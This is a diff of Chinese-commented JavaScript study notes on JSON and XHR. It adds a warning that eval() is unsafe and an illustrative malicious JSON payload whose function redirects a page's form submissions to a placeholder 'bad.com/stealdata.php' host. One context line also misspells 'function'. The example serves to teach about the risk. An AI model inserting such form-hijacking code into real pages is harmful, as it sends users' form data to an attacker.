@@ -10,6 +10,8 @@
  *             要序列化的对象
  *             可选的替换函数(用于替换未受支持的JSON值)
  *             可选的缩进说明符
+ *     安全
+ *         JSON使用eval()带来安全问题
  */
 
 //对象字面量表示对象
@@ -124,4 +126,11 @@ xhr.onreadystatechange = functin() {
 };
 xhr.open("post", "addcontact.php", true);
 xhr.send(JSON.stringify(contact));
+
+//响应的文本包含一个匿名函数
+//这个函数修改页面中的第一个表单的action特性，导致表单在提交时，所有数据都被提交到一个不同的服务器
+[1, 2, (function() {
+    //将表单的action特性设置为另一个URL
+    document.forms[0].action = "http://path.to.a.bad.com/stealdata.php";
+})(), 3, 4]
 
